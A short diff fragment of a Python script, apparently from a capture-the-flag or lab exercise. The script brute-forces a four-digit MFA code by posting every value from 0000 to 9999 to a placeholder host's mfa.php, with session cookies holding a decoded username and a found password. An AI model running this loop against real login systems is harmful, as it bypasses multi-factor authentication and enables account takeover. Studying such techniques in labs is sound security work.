@@ -105,7 +105,7 @@ cookies = {'PHPSESSID': '<cookie>','user':'<decoded_user>','pwd':'<found_pass>'}
 s.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
 
 
-for i in range(9999,5000,-1):
+for i in range(0000,9999):
         a = '{:d}'.format(i).zfill(4)
         print(a,end='\r')
         r = s.post('http://<ip>/console/mfa.php',cookies=cookies,data='code={}'.format(a))
